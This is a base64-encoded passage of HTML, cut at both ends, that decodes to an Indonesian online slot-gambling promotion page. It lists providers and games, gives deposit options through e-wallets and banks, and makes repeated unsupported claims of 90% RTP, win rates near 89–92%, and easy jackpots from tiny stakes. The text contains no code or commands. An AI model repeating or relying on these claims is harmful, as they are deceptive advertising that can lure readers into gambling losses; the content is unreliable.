bGV2ZWw9IjEiPjxiPklEIFBSTyBHYWNvciBQcmFnbWF0aWMgUGxheTwvYj48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGkgYXJpYS1sZXZlbD0iMSI+SUQgUFJPIEdhY29yIFBHIFNMT1Q8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGkgYXJpYS1sZXZlbD0iMSI+SUQgUFJPIEdhY29yIFBsYXl0ZWNoPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpIGFyaWEtbGV2ZWw9IjEiPklEIFBSTyBHYWNvciBKb2tlcjEyMzwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaSBhcmlhLWxldmVsPSIxIj5JRCBQUk8gR2Fjb3IgU2xvdDg4PC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpIGFyaWEtbGV2ZWw9IjEiPklEIFBSTyBHYWNvciBDUTk8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGkgYXJpYS1sZXZlbD0iMSI+SUQgUFJPIEdhY29yIEhhYmFuZXJvPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpIGFyaWEtbGV2ZWw9IjEiPklEIFBSTyBHYWNvciBNaWNyb0dhbWluZzwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaSBhcmlhLWxldmVsPSIxIj5JRCBQUk8gR2Fjb3IgSU9OIFNsb3Q8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGkgYXJpYS1sZXZlbD0iMSI+SUQgUFJPIEdhY29yIFBsYXkgTiBHbzwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaSBhcmlhLWxldmVsPSIxIj5JRCBQUk8gR2Fjb3IgUlRHIFNsb3Q8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGkgYXJpYS1sZXZlbD0iMSI+SUQgUFJPIEdhY29yIEZsb3cgR2FtaW5nPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpIGFyaWEtbGV2ZWw9IjEiPklEIFBSTyBHYWNvciBTcGFkZSBHYW1pbmc8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGkgYXJpYS1sZXZlbD0iMSI+SUQgUFJPIEdhY29yIE9uZVRvdWNoPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpIGFyaWEtbGV2ZWw9IjEiPklEIFBSTyBHYWNvciBMaXZlMjI8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGkgYXJpYS1sZXZlbD0iMSI+SUQgUFJPIEdhY29yIEpEQiBHYW1pbmc8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGkgYXJpYS1sZXZlbD0iMSI+SUQgUFJPIEdhY29yIEdhbWF0cm9uPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpIGFyaWEtbGV2ZWw9IjEiPklEIFBSTyBHYWNvciBBZHZhbnQgUGxheTwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaSBhcmlhLWxldmVsPSIxIj5JRCBQUk8gR2Fjb3IgWUdHRHJhc2lsPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpIGFyaWEtbGV2ZWw9IjEiPklEIFBSTyBHYWNvciBBc3Ryb3RlY2gmbmJzcDs8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDxwPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+Jm5ic3A7PC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+U2ViZWx1bSBtdWxhaSBiZXJtYWluLCBrYW1pIGFrYW4gdXJhaWthbiBiZWJlcmFwYSBnYW1lIElEIFBSTyAyMDIzIHRlcmJhcnUgZGFuIHRlcnBvcHVsZXIgeWFuZyBzZXJpbmcga2FsaSBtZW1iZXJpa2FuIGphY2twb3QgdGVyYmVzYXIgZGFuIHRlbnR1bnlhIG1lbWJlcmlrYW4gUlRQIHRlcnRpbmdnaS4gU2xvdCBvbmxpbmUgbXVkYWggdW50dWsgbWVtZW5hbmdrYW4gbWF4d2luLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5JRCBQcm8gU2xvdCBHYWNvciBQcmFnbWF0aWMgUGxheTwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPlBSTyBJRCBQcmFnbWF0aWMgUGxheSBzYWF0IGluaSBtZW5qYWRpIHNhbGFoIHNhdHUgUFJPIElEIHRlcnBvcHVsZXIgZGFuIHRlcnBlcmNheWEgeWFuZyBzZXJpbmcgbWVtYmVyaWthbiBqYWNrcG90IG1heHdpbiB0ZXJiZXNhciBiYWdpIHBhcmEgcGVtYWluLiBUYWh1biBpbmkgbWVyZWthIHRlcnVzIGJlcmlub3Zhc2kgZGFuIG1lbmFtYmFoa2FuIGJlcmJhZ2FpIHBlcm1haW5hbiBiYXJ1IGRlbmdhbiB0ZW1hIHZpc3VhbCB1bmlrIGRhbiBmaXR1ciBmcmVlc3BpbiBwZXJ0YW1hIGRhcmkgcHJvdmlkZXIgbGFpbi4gUGlsaWhhbiB0ZW1hIHRlcnBvcHVsZXIgc2VwZXJ0aSBTdWdhciBSdXNoLCBHYXRlcyBvZiBPbHltcHVzLCBTd2VldCBCb25hbnphLCBTdGFybGlnaHQgUHJpbmNlc3MsIFdpbGQgV2VzdCBHb2xkIGRhbiBtYXNpaCBiYW55YWsgbGFnaSBqZW5pcyBnYW1lIElEIFBSTyB0ZXJiYXJ1LiBTbG90IFByYWdtYXRpYyBQbGF5IGRhcGF0IGRpbWFpbmthbiBtZWxhbHVpIGtvbXB1dGVyIGRlc2t0b3AgYXRhdSBzbWFydHBob25lIEFuZHJvaWQgZGFuIElPUy48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PGI+SUQgUHJvIFNsb3QgR2Fjb3IgU2xvdDg4PC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+Rml0dXIgcGVybWFpbmFuIGRpIHNsb3Q4OCBkaXJhbmNhbmcgdW50dWsgbWVtYmVyaWthbiBzZW5zYXNpIGJlcm1haW4geWFuZyBsdWFyIGJpYXNhIHNlcnUuIERpZGlyaWthbiBzZWphayB0YWh1biAyMDA3IGRpIG5lZ2FyYSB0ZXRhbmdnYSBNYWxheXNpYSwgdGVsYWggbWVuamFkaSBzYWxhaCBzYXR1IHBlbnllZGlhIGp1ZGkgb25saW5lIHRlcnBlcmNheWEuIFRpbmdrYXQgUlRQIHlhbmcgZGliZXJpa2FuIGN1a3VwIHRpbmdnaSwgaGluZ2dhIDkwJS4gVGFrIGhlcmFuIGppa2EgbWFzaWggYmFueWFrIG9yYW5nIHlhbmcgbWVuamFkaWthbiBTbG90ODggc2ViYWdhaSBzYWxhaCBzYXR1IFBSTyBJRCBmYXZvcml0bnlhLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5JRCBQcm8gU2xvdCBHYWNvciBQRyBTb2Z0PC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+UEcgU29mdCBJbmRvbmVzaWEgYWRhbGFoIHNhbGFoIHNhdHUgcGVsb3BvciBwZW55ZWRpYSBwZXJtYWluYW4gc2xvdCB0ZXJsdWN1IHlhbmcgZGlzdWthaSBiYW55YWsgb3JhbmcuIE5pbGFpIGphY2twb3QgeWFuZyBkaXRhd2Fya2FuIGp1Z2Egc2FuZ2F0IGJlc2FyIGRlbmdhbiBrZW1lbmFuZ2FuIGJlc2FyIHlhbmcgdGVyc2VkaWEgZGkgUEcgU29mdCBJbmRvbmVzaWEuIFNlamFrIHRhaHVuIDIwMTUgaGluZ2dhIHNla2FyYW5nIHN1ZGFoIGFkYSByYXR1c2FuIGdhbWUgSUQgUFJPIHlhbmcgYmlzYSBkaW1haW5rYW4gdW50dWsgbWVuZGFwYXRrYW4ga2VtZW5hbmdhbiB5YW5nIGxlYmloIG11ZGFoIHNla2FsaWd1cyBtZW1idWF0IHNldGlhcCB0YXJ1aGFuIGxlYmloIG11ZGFoIHVudHVrIGRpbWVuYW5na2FuLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5JRCBQcm8gU2xvdCBHYWNvciBIYWJhbmVybzwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkFuZGEgZGFwYXQgbWVtYWlua2FuIHNsb3QgSGFiYW5lcm8gZGVuZ2FuIG5pbGFpIHNsb3QgUlRQIHlhbmcgdGluZ2dpIGRhbiB0aWRhayBtZW5nZWNld2FrYW4uIEhhYmFuZXJvIFNsb3RzIGFkYWxhaCBzYWxhaCBzYXR1IHBlcnVzYWhhYW4gZ2FtZSBqdWRpIHNsb3Qgb25saW5lIHlhbmcgc3VkYWggbGFtYSBiZXJkaXJpIGRlbmdhbiBtZW5nZ3VuYWthbiBzZXJ2ZXIgZWtzdGVybmFsIChUaGFpbGFuZCwgTWFsYXlzaWEsIEthbWJvamEsIFZpZXRuYW0gZGFuIEhvbmcgS29uZykuIEJhaGthbiBwZXJtYWluYW4gSGFiYW5lcm8gU2xvdCBtZXJ1cGFrYW4geWFuZyB0ZXJtdWRhaCBkYW4gdGVybXVkYWggdW50dWsgZGltYWlua2FuIGJhZ2kgcGFyYSBwZW11bGEuIEFkYSBsZWJpaCBkYXJpIDE4OCBqZW5pcyBwZXJtYWluYW4gbWVzaW4ganVkaSBzbG90IG9ubGluZSBkZW5nYW4gamFja3BvdCB0ZXJiZXNhciB5YW5nIGJpc2EgZGltYWlua2FuIGRpIEhhYmFuZXJvIFNsb3QgaGFueWEgZGVuZ2FuIG1pbmltYWwgdGFydWhhbiBzZXJpYnUgcnVwaWFoIHNhamEuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPklEIFBybyBTbG90IEdhY29yIEpva2VyIEdhbWluZzwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkpva2VyIEdhbWluZyBhdGF1IHlhbmcgbGViaWggZGlrZW5hbCBkZW5nYW4gam9rZXIxMjMgdGVya2VuYWwgZGVuZ2FuIHBlcm1haW5hbiBzbG90IG9ubGluZSB5YW5nIHBvcHVsZXIgeWFpdHUgVGVtYmFrIElrYW4uIEFuZGEganVnYSBoYXJ1cyBtZW5jb2JhIElEIFBSTyBvbmxpbmUgbWVyZWthIGthcmVuYSBtZW1iZXJpa2FuIG5pbGFpIExpdmUgUlRQIHNla2l0YXIgOTIlLiBTZWxhaW4gdmFyaWFzaSBwZXJtYWluYW4gc2xvdCwgbGl2ZSBjYXNpbm8ganVnYSB0ZXJzZWRpYSB1bnR1ayBtZW11YXNrYW4ga2VpbmdpbmFuIEFuZGEgdW50dWsgbWVuYW5nIHNlYmVzYXItYmVzYXJueWEuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPklEIFBybyBTbG90IEdhY29yIENROTwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkRpa2VuYWwgZGVuZ2FuIGtlbXVkYWhhbiBtZW5hbmcgZGFuIGphY2twb3QgcHJvZ3Jlc2lmLCB0aW5na2F0IGtldW50dW5nYW5ueWEgY3VrdXAgbWVuYXJpayBiYWdpIGJldHRvciBJbmRvbmVzaWEuIEJlcnN1bWJlciBkYXJpIHNlcnZlciBUYWl3YW4sIENROSBtZW5hd2Fya2FuIGdhbWUgc2xvdCBvbmxpbmUgZGFuIElEIFBSTywgdGVtYmFrIGlrYW4sIGRhbiBnYW1lIGFyY2FkZSBsYWlubnlhLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5JRCBQcm8gU2xvdCBHYWNvciBTcGFkZWdhbWluZzwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkluZ2luIG1lbmNvYmEgcGlsaWhhbiBnYW1lIGp1ZGkgSUQgUFJPIGxhaW5ueWEgZGVuZ2FuIHNsb3QgUlRQIHRlcnRpbmdnaSBzYWF0IGluaSBzaWxhaGthbiBjb2JhIFNwYWRlZ2FtaW5nIHlhbmcgc3VkYWggYWRhIHNlamFrIHRhaHVuIDIwMDcuIEhhZGlyIGRlbmdhbiBkZXNhaW4gbWVuYXJpaywgZml0dXIgcGVybWFpbmFuIGRhbiBzZW5zYXNpIGJlcm1haW4gZGl0YW1iYWggZGVuZ2FuIHNsb3QgUlRQIHRlcnRpbmdnaSB5YW5nIG1lbWJ1YXRueWEgbWVtdWRhaGthbiBhbmRhIG1lbmRhcGF0a2FuIHJlemVraSBtYWtzaW1hbCBtZWxhbHVpIHBlcm1haW5hbiBqdWRpIHNsb3Qgb25saW5lLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5JRCBQcm8gU2xvdCBHYWNvciBJT04gU2xvdDwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPlNsb3QgSU9OIGRlbmdhbiBuYW1hIGFzbGkgSU9OQ2x1YiBiZXJkYXNhcmthbiBTZXJ2ZXIgS2FtYm9qYSBhZGFsYWggc2FsYWggc2F0dSBrYXNpbm8gcGFsaW5nIHRlcmtlbmFsIGRpIEthbWJvamEgc2VsYW1hIDEwIHRhaHVuIHRlcmFraGlyIGRhbiBtZW1pbGlraSBsaXNlbnNpIHJlc21pIGRhcmkgUGVtZXJpbnRhaCBLZXJhamFhbiBLYW1ib2phLiBVbnR1ayBnYW1lIHNsb3Qgb25saW5lIGRhbiBQUk8gSUQgeWFuZyBwYWxpbmcgcG9wdWxlciBhZGFsYWggZmFmYWZhIGJlcnRlbWEgaG9raSBkZXdhIHlhbmcgbWVtYmF3YSBrb2luIGtlYmVydW50dW5nYW4uPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPklEIFBybyBTbG90IEdhY29yIFBsYXl0ZWNoPC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+UGxheXRlY2ggbWVuZ2hhZGlya2FuIGJlcmFnYW0gZ2FtZSBzZXJ1IHlhbmcgYmlzYSBrYW11IG1haW5rYW4uIEppa2EgQW5kYSBtZW5ndWFzYWkgdGVrbmlrIGJlcnRhcnVoLCBjb2JhbGFoIHNsb3Qgb25saW5lIElEIFBSTyBkYW4gUGxheXRlY2ggdW50dWsgbWVuZGFwYXRrYW4gamFja3BvdCB0ZXJiZXNhci48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PGI+SUQgUHJvIFNsb3QgR2Fjb3IgTWljcm9nYW1pbmc8L2I+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5EYXJpIHNlbXVhIHBlbnllZGlhIFBSTyBJRCB5YW5nIG11ZGFoIGRpbWVuYW5na2FuIHNlYmVsdW1ueWEsIE1pY3JvZ2FtaW5nIGFkYWxhaCBwZW55ZWRpYSBnYW1lIHNsb3Qgb25saW5lIGRhbiBJRCBQUk8gcGFsaW5nIHNlbmlvci4gTWljcm9nYW1pbmcgZGlrZW5hbCBkZW5nYW4gcGVybWFpbmFubnlhIHlhbmcgc2VkZXJoYW5hIGRhbiBiZXJrdWFsaXRhcywgc2VoaW5nZ2EgYWRhIGxlYmloIGRhcmkgMzAwIHZhcmlhbiBJRCBQUk8geWFuZyB0ZXJzZWRpYSBvbmxpbmUgZGFsYW0gMzAgYmFoYXNhIGJlcmJlZGEuIEFuZGEgcGFzdGkgYWthbiBtZW5kYXBhdGthbiBwZW5nYWxhbWFuIHlhbmcgbWVuYXJpayBkYW4gbWVuYW50YW5nIGRhcmkgSUQgUFJPIG9ubGluZSBNaWNyb2dhbWluZyBzZXBlcnRpIFdlc3Rlcm4gR29sZCAyIGRhbiBBbmNpZW50IEZvcnR1bmVzIFpldXMuPC9zcGFuPjwvcD4KCgogICAgICAgICAgICAgICAgPGgyPlNsb3QgSUQgUHJvIEdhbXBhbmcgTWVuYW5nIE1heHdpbiBIYXJpIEluaSBKYWNrcG90IFRlcmJlc2FyIDIwMjM8L2gyPgoKICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+S2VjYW5nZ2loYW4gZGFuIHBlcmtlbWJhbmdhbiB6YW1hbiB0ZW50dW55YSBtZW51bnR1dCBhZ2VuIHVudHVrIHRlcnVzIGJlcmtlbWJhbmcgZGFsYW0gbWVtYnVhdCBwZXJtYWluYW4gbWVuamFkaSBsZWJpaCBvcHRpbWFsLiBEaWtldGFodWkgbWFzaWggYmFueWFrIHNpdHVzIHNsb3QgeWFuZyB0aWRhayBtZW1wZWR1bGlrYW4gb3B0aW1hc2kgZGFsYW0gbWVtcGVydGFoYW5rYW4gbWVtYmVybnlhLiBIYWwgaW5pbGFoIHlhbmcgYWthbiBtZW1idWF0IG1lbWJlciBnZXJhbSBkYW4gbWVuY2FyaSBzaXR1cyBzbG90IG9ubGluZSBnYWNvciBsYWlubnlhLiBEaSBJRCBQUk8ga2FtaSBtZW1pbGlraSB2aXNpIGRhbiBtaXNpIHlhaXR1IHRlcnVzIG1lbWJlcmlrYW4gb3B0aW1hbGlzYXNpIGRhbGFtIHBlbGF5YW5hbiwgc2VydGEgbWVuamFnYSBrZXJhaGFzaWFhbiBkYXRhIHByaXZhc2kgc2VsdXJ1aCBtZW1iZXIuPC9zcGFuPjwvcD4KCiAgICAgICAgICAgICAgICA8aDI+RGFmdGFyIExpbmsgSUQgUHJvIFNpdHVzIEFnZW4gU2xvdCBHYWNvciBPbmxpbmUgVGVyYmFydSAyMDIzPC9oMj4KCiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPlNpdHVzIEp1ZGkgU2xvdCBNdWRhaCBNZW5hbmcgVGVyYmFydSBJbmRvbmVzaWEgZGVuZ2FuIGFnZW4gc2xvdCBvbmxpbmUgeWFuZyBha2FuIHNlbGFsdSBtZW1iZXJpa2FuIGZhc2lsaXRhcyBkYW4gbGF5YW5hbiB0ZXJwZW50aW5nIHVudHVrIHBhcmEgcGVtYWluIFBSTyBJRCBvbmxpbmUgSW5kb25lc2lhLiBkaWFudGFyYSB5YW5nIGxhaW4uPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+RGkgc2l0dXMganVkaSBvbmxpbmUgdGVycGVyY2F5YSBJRCBQUk8gSGFyaSBpbmkgZGFuIGp1Z2EgbWVuYW5nIG1lbmdoYWRpcmthbiBsYXlhbmFuIGp1ZGkgc2xvdCBvbmxpbmUsIGxheWFuYW4gZGVwb3NpdCBkYW4gZGVwb3NpdCBwdWxzYSB0ZWxrb21zZWwgbWVsYWx1aSBEYW5hLCBTYWt1a3UsIE92bywgTGlua0FqYSwgR29wYXkgZS1tb25leS4gVGlkYWsgaGFueWEgaXR1IGthbWkgZGlkdWt1bmcgb2xlaCBsYXlhbmFuIGp1ZGkgc2xvdCBkZXBvc2l0IGJhbmsgbG9rYWwgQkNBLCBCUkksIEJOSSwgTWFuZGlyaSBkYW4gQ0lNQiBOaWFnYS48L3NwYW4+PC9wPgoKCiAgICAgICAgICAgICAgICA8aDI+OSBSZWtvbWVuZGFzaSBKZW5pcyBTbG90IFRlcmdhY29yICYgTXVkYWggSmFja3BvdCBXaW4gUmF0ZSBUZXJ0aW5nZ2k8L2gyPgoKICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+U2ViYWdhaSBwZW1haW4gc2xvdCBvbmxpbmUgdGVudHVueWEgcGVtYWluIG1lbWJ1dHVoa2FuIGRhdGEvcmVrb21lbmRhc2kgSUQgUFJPIGRhbiBzbG90IG9ubGluZSBkZW5nYW4gb2RkcyBqYWNrcG90IGRhbiB0aW5na2F0IGtlbWVuYW5nYW4gdGVydGluZ2dpIGRpIHNpdHVzIGthbWkuIEthbWkgc2ViYWdhaSBhZ2VuIGp1ZGkgb25saW5lIHRlcmJhaWsgZGkgSW5kb25lc2lhIGFrYW4gbWVtYmVyaWthbiBpbmZvcm1hc2kgYmVyZGFzYXJrYW4gZGF0YSBkYXJpIHNlcnZlciBwdXNhdCBrYW1pIGRhbiBkYXRhIGtlbWVuYW5nYW4gdGFydWhhbiBrYW1pLCBkaSBtYW5hIG1lcmVrYSBtZW5kYXBhdGthbiBqYWNrcG90IGRhbiBzZW5zYXNpIHRlcmJhbnlhay4gQmVyaWt1dCBhZGFsYWggOCBqZW5pcyBnYW1lIHlhbmcgdGVsYWggbWVuZGFwYXRrYW4ganVsdWthbiBJRCBQUk8gZGFyaSBrYW1pLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5Td2VldCBCb25hbnphICggUHJhZ21hdGljIFBsYXkgKTwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPlN3ZWV0IEJvbmFuemEgYWRhbGFoIGdhbWUgcGFsaW5nIHZpcmFsIHlhbmcgZGltYWlua2FuIG9sZWggYmFueWFrIGJldHRvciBzbG90IGRhbiB5b3V0dWJlciBkaSBJbmRvbmVzaWEsIGdhbWUgeWFuZyBtdWRhaCBkYW4gZW5hayBkaXBhbmRhbmcga2FyZW5hIENhbmR5IENydXNoIGFkYWxhaCByZWtvbWVuZGFzaSBzbG90IGdhY29yIHByYWdtYXRpcyB5YW5nIGthbWkgcGlsaWguIERlbmdhbiBtaW5pbWFsIHRhcnVoYW4ga2VjaWwgaGFueWEgMjAwIHBlcmFrLCBhbmRhIGJpc2EgbGFuZ3N1bmcgbWVtYWlua2FuIHBlcm1haW5hbiBrb25zZXAgYnVhaCBkYW4gcGVybWVuIGluaSBkYW4gbWVuZGFwYXRrYW4gamFja3BvdCB5YW5nIHNhbmdhdCBiZXNhciBrYXJlbmEgdGluZ2thdCBrZW1lbmFuZ2FuIGRhbGFtIHBlcm1haW5hbiBpbmkgYWRhbGFoIHlhbmcgdGVyYmFpayBkYW4gdGVydGluZ2dpIG1lbmNhcGFpIDkwJS48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PGI+S29pIEdhdGUgKCBIYWJhbmVybyApPC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+S29pIEdhdGUgYW5kYWxhbiBJRCBQUk8gSGFiYW5lcm8sIGhhbnlhIGRlbmdhbiAzIGJhciBtZXJla2EgbWVtYW5qYWthbiBiYW55YWsgdGFydWhhbiBzbG90IG9ubGluZSBkaSBJbmRvbmVzaWEuIEthcmVuYSBtb2RhbCBrZWNpbCBwdW4gYmlzYSBtZW5qYWRpIGJlc2FyIGRlbmdhbiBiZXJtYWluIGRpIEtPSSBHYXRlLCBoYW55YSBkZW5nYW4gbWVuY2FyaSAzIGlrYW4gYmVydHVydXQtdHVydXQgYW5kYSBiaXNhIG1lbGlwYXRnYW5kYWthbiBrZXVudHVuZ2FuIGRlcG9zaXQgYW5kYSBtZW5qYWRpIHNhbmdhdCBiZXNhci4gV2luIFJhdGUgbWVuY2FwYWkgODklITwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5HYXRlcyBvZiBPbHltcHVzICggUHJhZ21hdGljIFBsYXkgKTwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkdhdGVzIG9mIE9seW1wdXMgYWRhbGFoIGdhbWUgc2xvdCBvbmxpbmUgdGVyYmFpayB1bnR1ayBrYW1pLiBUYW1waWxhbm55YSBzYW5nYXQgSEQsIGRhbiBzZW11YSBhc3BlayBrZWNpbCB5YW5nIGRpcGVydGltYmFuZ2thbiBtZW1idWF0IHNldGlhcCBwdXRhcmFuIHlhbmcga2FtaSBsYWt1a2FuIG1lbWJ1YXQgcGVybWFpbmFuIHRlcmFzYSBzYW5nYXQgdGlkYWsgbWVtYm9zYW5rYW4uIERhbiBpbmlsYWggSUQgUFJPIGRlbmdhbiB0aW5na2F0IGJvY29yYW4gcGFsaW5nIHN0YWJpbCBkaSBQcmFnbWF0aWMgUGxheSwgZ3JhZmlrIGRhbiBzdWFyYSBwZXJtYWluYW5ueWEgc2FuZ2F0IGNvY29rIHlhbmcgbWVtYnVhdCBJRCBQUk8gc2FuZ2F0IHBvcHVsZXIgZGFuIHRpZGFrIGx1cGEgc2FuZ2F0IG11ZGFoIGJvY29yLCB0aW5na2F0IGtlbWVuYW5nYW4gc2xvdCBtZW5jYXBhaSA5MiUuIEhhbnlhIGRlbmdhbiBtb2RhbCBrZWNpbCBzZXBlcnRpIDEwcmIsIGFuZGEgYmVydGFydWggMjAwIHBlcmFrIGJpc2EgbWVuY2FwYWkganV0YWFuIHJ1cGlhaCBoYW55YSBkZW5nYW4gYmViZXJhcGEgcHV0YXJhbiBzYWphITwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5NYWhqb25nIFdheXMgKCBQRyBTbG90cyApPC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+TWFoam9uZyBhZGFsYWggcGVybWFpbmFuIHRyYWRpc2lvbmFsIGRhcmkgVGlvbmdrb2sgeWFuZyBtYXNpaCBkaW1haW5rYW4gc2FtcGFpIHNla2FyYW5nLiBEYWxhbSBNYWhqb25nIFdheXMsIGtvbWJpbmFzaSB0cmFkaXNpb25hbCBkYW4gbW9kZXJuIGRpcmFtdSBtZW5qYWRpIElEIFBSTyB5YW5nIHNhbmdhdCBtZW55ZW5hbmdrYW4gdW50dWsgZGltYWlua2FuLiBUZXJidWt0aSBiYWh3YSBNYWhqb25nIFdheXMgYWRhbGFoIElEIFBSTyB0ZXJwb3B1bGVyIGRpIFBHU2xvdHMsIGRlbmdhbiB0aW5na2F0IGtlbWVuYW5nYW4gaGluZ2dhIDkwJSEgVGFydWhhbiBtaW5pbWFsIGRpIHNpbmkgYWRhbGFoIHNlcmlidSBydXBpYWgsIGphZGkgbW9kYWwga2VjaWwgY3VrdXAgc3VsaXQgamlrYSBpbmdpbiBtZW1haW5rYW4gcGVybWFpbmFuIGluaS48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PGI+V2lsZCBGYWlyaWVzICggSm9rZXIxMjMgKTwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPldpbGQgRmFpcmllcyBhZGFsYWggZ2FtZSBKT0tFUjEyMyB0ZXJwb3B1bGVyIG9sZWggYmV0dG9ycyBkaSBJbmRvbmVzaWEsIHBlcm1haW5hbiBtdWRhaCB1bnR1ayBtZW5kYXBhdGthbiBqYWNrcG90IGRlbmdhbiBtdW5jdWxueWEgMyBwZXJpIGNhbnRpayB5YW5nIHNpYXAgZGF0YW5nIHVudHVrIG1lbmdhbWJpbCBqYWNrcG90IGRhbiBkZXBvc2l0IEFuZGEgYmlzYSBiZXJ1YmFoIG1lbmphZGkga2V1bnR1bmdhbiBiZXJsaXBhdC4gSW5pIGFkYWxhaCBzYWxhaCBzYXR1IHBlcm1haW5hbiBmYXZvcml0IGRpIEpva2VyMTIzLjwvc